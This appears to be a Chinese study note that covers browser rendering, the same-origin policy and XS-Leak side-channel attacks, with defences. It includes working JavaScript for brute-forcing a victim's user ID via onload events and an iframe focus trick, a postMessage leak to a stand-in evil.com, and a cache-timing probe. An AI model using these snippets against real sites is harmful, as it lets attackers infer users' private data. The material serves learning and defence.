## 浏览器渲染过程
静态资源-->DOM树构建-->CSSOM树构建-->渲染树构建-->页面布局-->页面绘制-->前端页面
- **DOM树构建**：渲染引擎使用HTML解析器（调用XML解析器）解析HTML文档，将各个HTML元素逐个转化成DOM节点，从而生成DOM树；
- **CSSOM树构建**：CSS解析器解析CSS，并将其转化为CSS对象，将这些CSS对象组装起来，构建CSSOM树；
- **渲染树构建**：DOM 树和 CSSOM 树都构建完成以后，浏览器会根据这两棵树构建出一棵渲染树；
- **页面布局**：渲染树构建完毕之后，元素的位置关系以及需要应用的样式就确定了，这时浏览器会计算出所有元素的大小和绝对位置；
- **页面绘制**：页面布局完成之后，浏览器会将根据处理出来的结果，把每一个页面图层转换为像素，并对所有的媒体文件进行解码。
这每一步的产物分别是：DOM树，CSSOM树，渲染树，盒模型，界面。
过程也可以说是
```
HTML.字符串-->解析HTML-->样式计算-->布局-->分层-->绘制-->分块-->光栅化-->画-->像素信息
```
### 解析HTML
浏览器会先将HTML字符串解析成DOM树和CSSOM树，便于操作，也提供了JS操作这两棵树的能力。
- `documnent`是DOM树的根节点，body是根节点的子节点，只要拿到根节点就可以拿到网页所有节点。
- `StyleSheetList`就是DOM树的根节点，代表网页中所有层叠样式表。
例如
```js
<style></style> // 内部样式表 
<link src=".."></link> // 外部样式表 
<div style=".."></div> // 内联样式表或行内样式表 
// 浏览器默认样式表
```
通过`document.styleSheets`可以拿到除了内联和默认样式表之外的**所有内部和外部样式表**。
通过`addRule`API给所有的`div`加上红色边框。
**预解析**：为了提高解析效率，浏览器在开始解析前，会启动一个预解析的线程，率先下载 HTML 中的外部 CSS 文件和 外部的 JS 文件。
如果主线程解析到`link`位置，此时外部的 CSS 文件还没有下载解析好，主线程不会等待，继续解析后续的 HTML。这是因为下载和解析 CSS 的工作是在预解析线程中进行的。这就是 CSS 不会阻塞 HTML 解析的根本原因。
如果主线程解析到`script`位置，会停止解析 HTML，转而等待 JS 文件下载好，并将全局代码解析执行完成后，才能继续解析 HTML。这是因为 JS 代码的执行过程可能会修改当前的 DOM 树，所以 DOM 树的生成必须暂停。这就是 JS 会阻塞 HTML 解析的根本原因。
### 样式计算
主线程会遍历得到的 DOM 树，依次为树中的每个节点计算出它最终的样式，称之为 `Computed Style`。

在这一过程中，很多预设值会变成绝对值，比如`red`会变成`rgb(255,0,0)`；相对单位会变成绝对单位，比如`em`会变成`px`
### 布局
布局阶段会依次遍历 DOM 树的每一个节点，计算每个节点的几何信息。例如节点的宽高、相对包含块的位置。
### 分层
主线程会使用一套复杂的策略对整个布局树中进行分层。
分层的好处在于，将来某一个层改变后，仅会对该层进行后续处理，从而提升效率。
滚动条、堆叠上下文、transform、opacity 等样式都会或多或少的影响分层结果，也可以通过`will-change`属性更大程度的影响分层结果。
可以在开发者工具中查看图层。
### 绘制
主线程会为每个层单独产生绘制指令集，用于描述这一层的内容该如何画出来。
什么是绘制指令集？
类似于：
`将笔移动到（10，30）的位置 画一个 20 * 30 的矩形 将矩形填充为红色 ...`
绘制完成后，渲染主线程的工作到此为止，**剩余步骤交给其他线程来完成**。
### 分块
完成绘制后，主线程将每个图层的绘制信息提交给合成线程，剩余工作将由**合成线程**完成。
合成线程首先对每个图层进行**分块**，将其划分为更多的小区域。
它会从线程池中拿取多个线程来完成分块工作。
分块将每一层分成多个小的区域。
分块的工作是多个线程同时进行的。
### 光栅化
光栅化是将每个块变成位图。优先处理靠近视口的块。
光栅化是将每个块变成位图，位图可以理解成内存里的一个二维数组，这个二维数组记录了每个像素点信息。
合成线程会将块信息交给 GPU 进程，以极高的速度完成光栅化。
GPU 进程会开启多个线程来完成光栅化，并且优先处理靠近视口区域的块。
光栅化的结果，就是一块一块的位图。
### 画
合成线程拿到每个层、每个块的位图后，生成一个个`「指引（quad）」`信息。
指引会标识出每个位图应该画到屏幕的哪个位置，以及会考虑到旋转、缩放等变形。
变形发生在合成线程，与渲染主线程无关，这就是`transform`效率高的本质原因。
合成线程会把 quad 提交给 GPU 进程，由 GPU 进程产生系统调用，提交给 GPU 硬件，完成最终的屏幕成像。
## 同源策略
浏览器的同源策略（Same-Origin Policy）是一种安全机制，用于限制一个网页文档或脚本如何与来自不同源的资源进行交互。同源是指两个 URL 的协议、主机和端口号都相同。

同源策略的目的是保护用户的隐私和安全。它可以防止恶意网站通过脚本访问其他网站的敏感信息或进行恶意操作。同源策略主要限制以下几个方面的交互：

1. 跨域资源读取：在浏览器中，一个网页只能通过 AJAX、WebSocket 或 Fetch API 等方式来请求同源网站的数据。这意味着脚本无法直接读取来自其他域的数据，以防止恶意网站获取用户的敏感信息。

2. 跨域资源加载：浏览器中的脚本无法直接加载来自其他域的资源，如 JavaScript 文件、CSS 文件或字体文件。这是为了防止恶意脚本篡改其他域的资源或执行恶意代码。

3. 跨域窗口通信：浏览器中的脚本只能与同源窗口进行通信，不能直接操作或获取来自其他域的窗口对象的内容。
同源策略通过限制不同源之间的交互，提高了浏览器的安全性。然而，有时需要在不同源之间进行数据交换，为此引入了一些跨域解决方案，如跨域资源共享（CORS）和跨文档消息传递（PostMessage）。这些解决方案允许在特定条件下进行跨域交互，同时保持了一定的安全性。
## XS-Leak
跨站泄漏（又称 XS-Leaks、XSLeaks）是一类源于 Web 平台内置侧信道攻击的漏洞。它们利用 Web 的核心原则——可组合性（允许网站之间相互交互），滥用合法机制来推断用户信息。XS-Leaks 与跨站请求伪造（CSRF）技术的相似之处在于，它们的主要区别在于，CSRF 允许其他网站代表用户执行操作，而 XS-Leaks 则可用于推断用户信息。
虽然WEB应用程序之间的交互收到同源策略的限制，但是XS-Leak却巧妙的利用了网站交互过程中暴露的小段信息。XS-Leak就是会暴露用户的隐私信息。
交互结果往往以二进制的形式呈现，也就是问题的答案只有是或者不是。
例如提出以下问题

>用户在其他网络应用程序中搜索_“secret”_一词时，搜索结果中是否出现过该词？

这个问题可能等同于问，

>查询_“?query=secret”_是否返回_HTTP 200_状态码？

也可以这样问

>在应用程序中从_?query=secret_加载资源是否会触发_onload_事件？

攻击者可以重复上述查询，使用许多不同的关键词，从而利用查询结果推断出用户的敏感数据。浏览器提供了种类繁多的不同API，虽然这些API的初衷是好的，但最终可能会泄露少量跨域信息。
### 例子
网站不允许直接访问其他网站的数据，但可以加载其他网站的资源并观察其副作用。例如，evil.com被禁止直接读取bank.com的响应，但evil.com可以尝试加载bank.com的脚本，并判断脚本是否加载成功。
假设_bank.com_有一个 API 端点，该端点返回有关用户给定类型交易的收据的数据。
1. evil.com可能会尝试将 URL `bank.com/my_receipt?q=groceries`作为脚本加载。默认情况下，浏览器在加载资源时会附加 cookie，因此发送到bank.com的请求将携带用户的凭据。
2. 如果用户最近购买过groceries，脚本将成功加载并返回HTTP 200状态码。如果用户没有购买过杂货，则请求加载失败并返回HTTP 404状态码，这将触发一个错误事件。
3. 通过监听错误事件并使用不同的查询重复此方法，攻击者可以推断出有关用户交易历史的大量信息。
这就是基于错误事件的攻击。
**例如**
我可以将来自其他来源的图片甚至脚本嵌入到我的页面中。但根据同源策略，读取跨域资源是不允许的。
当浏览器发送资源请求时，服务器会处理该请求并决定响应状态，例如（200 OK 或 404 NOT FOUND）。浏览器收到 HTTP 响应后，会根据响应触发相应的 JavaScript 事件（onload 或 onerror）。
- `GET /api/user/1234` 200 OK  当前登录用户为 1234，因为我们已成功加载资源（onload事件已触发）
- `GET /api/user/1235`- 401 未授权 - 1235 不是当前登录用户的 ID（将触发onerror事件)
通过这个原理，我们就可以脚本爆破来得到受害者的id。
```js
function checkId(id) { 
	const script = document.createElement('script'); 
	script.src = `https://example.com/api/users/${id}`; 
	script.onload = () => { 
		console.log(`Logged user id: ${id}`); 
	};
	document.body.appendChild(script); } 
// Generate array [0, 1, ..., 40]
const ids = Array(41) 
	.fill() 
	.map((_, i) => i + 0); 
for (const id of ids) { 
	checkId(id); 
}
```
这里并不需要读取响应体，因为浏览器的同源策略也读取不了，它只需要`onload`出触发时收到成功的信息即可。
### 攻击手法
**对postMessage通信的攻击**
有时在受控环境下，即使遵循标准操作程序 (SOP)，我们也希望在不同来源之间交换信息。我们可以使用 postMessage 机制。请参见以下示例：
```js
// Origin: http://example.com 
const site = new URLSearchParams(window.location.search).get('site'); 
// https://evil.com 
const popup = window.open(site); 
popup.postMessage('secret message!', '*');  
// Origin: https://evil.com 
window.addEventListener('message', e => {     alert(e.data) 
// secret message! - leak 
});
```
这样攻击者就截获了窗口引用。
为避免出现上述情况（攻击者获取了接收消息的窗口引用），请务必`targetOrigin`在 postMessage 中指定确切的窗口引用。使用`targetOrigin`通配符`*`会导致任何来源都能接收消息。
把`*`改成具体的`https://sub.example.com`
**帧计数攻击**
窗口中已加载框架的数量信息可能存在泄露风险。例如，某个应用程序会将搜索结果加载到框架中，如果搜索结果为空，则该框架不会显示。
攻击者可以通过计算对象中的帧数来获取窗口中已加载帧数的信息`window.frames`。

因此，攻击者最终可以获取电子邮件列表，然后通过一个简单的循环，打开多个窗口并统计窗口帧数。如果打开的窗口中的窗口帧数等于 1，则说明该电子邮件地址已存在于受害者所用应用程序的客户端数据库中。
**利用浏览器缓存攻击**
浏览器缓存有助于显著缩短页面再次加载的时间。然而，它也可能带来信息泄露的风险。如果攻击者能够在页面加载完成后检测到某个资源是否从缓存中加载，他就能据此推断出一些信息。
原理很简单，从缓存内存加载的资源比从服务器加载的资源快得多。
攻击者可以在其网站上嵌入只有管理员用户才能访问的资源。然后，利用 JavaScript 读取特定资源的加载时间，并根据此信息推断该资源是否已缓存。
```js
// Threshold above which we consider a resource to have loaded from the server 
// const THRESHOLD = ... 
const adminImagePerfEntry = window.performance 
	.getEntries() 
	.filter((entry) => entry.name.endsWith('admin.svg')); 
if (adminImagePerfEntry.duration < THRESHOLD) { 
	console.log('Image loaded from cache!') 
}
```
#### 图像的不可预测标记¶
当用户希望资源仍然被缓存，而攻击者无法发现时，可以用token。
`/avatars/admin.svg?token=be930b8cfb5011eb9a030242ac130003`
- 对于每个用户而言，令牌应该是唯一的。
- 如果攻击者无法猜出此令牌，则无法检测到资源是否从缓存加载。
如果可以接受服务器重新加载导致的性能下降，可以禁用缓存机制，要禁用需要保护的资源的缓存，请设置响应头`Cache-Control: no-store`。

### 防御
**利用token**
可以用token保护我们的敏感端点
```
/api/users/1234?token=be930b8cfb5011eb9a030242ac130003
```
这样就没有办法爆破得到用户id了。
**获取元数据**
此标头指定请求的发送位置，其取值如下：
- `cross-site`
- `same-origin`
- `same-site`
- `none`用户直接访问了该页面
与 Sec-Fetch-Dest 类似，此标头由浏览器自动添加到每个请求中，并且是 Fetch Metadata 标准的一部分。用法示例：
```python
app.get('/api/users/:id', authorization, (req, res) => {     
	if (req.get('Sec-Fetch-Site') === 'cross-site') {         
		return res.sendStatus(403);     
		}      
		# ... more code      
	return res.send({ id: 1234, name: 'John', role: 'admin' }); 
});
```
### 实验
```js
<body onblur="if(!window.found){window.found=true;alert('Found: '+position_of_current_id)}">
<div id=y></div>
<script>
position_of_current_id = 1000;  
found = false;
var iframe = document.createElement('iframe');  
iframe.src='http://subdomain1.portswigger-labs.net/x-domain_leak_focus/test2.html';  
document.body.appendChild(iframe);  
iframe.onload = tryNextID;
function tryNextID() {  
	if(!found){  
		document.getElementById('y').textContent = position_of_current_id;  
		iframe.src='http://subdomain1.portswigger-labs.net/x- domain_leak_focus/test2.html#'+position_of_current_id;  
		timer = setTimeout(function(){  
			if(!found && position_of_current_id < 2000) {  
				position_of_current_id++;  
			}  
			tryNextID();  
		},50);  
	}  
}
</script>
</body>
```
在服务器写这样一段就可以爆破id，
`window.onblur`事件用于检测目标元素是否获得焦点。
使用 div 元素来显示当前正在检查的 id 位置，以便可以实时观察攻击。
当触发 blur 事件时，将设置 found 标志，表明我们获得了焦点。
创建了一个指向目标域的 iframe，当事件 `onload`被调用时，我们调用 tryNextID 函数。
tryNextID 函数显示当前位置，然后将哈希值更改为下一个可能的 ID。如果找不到该 ID，则候选 ID 递增，并`setTimeout`在 50 毫秒后调用 a 函数。



## 参考文章
https://zhuanlan.zhihu.com/p/561696825
https://juejin.cn/post/7262263050102095929#heading-3
https://xsleaks.dev/
https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html
https://portswigger.net/research/xs-leak-leaking-ids-using-focus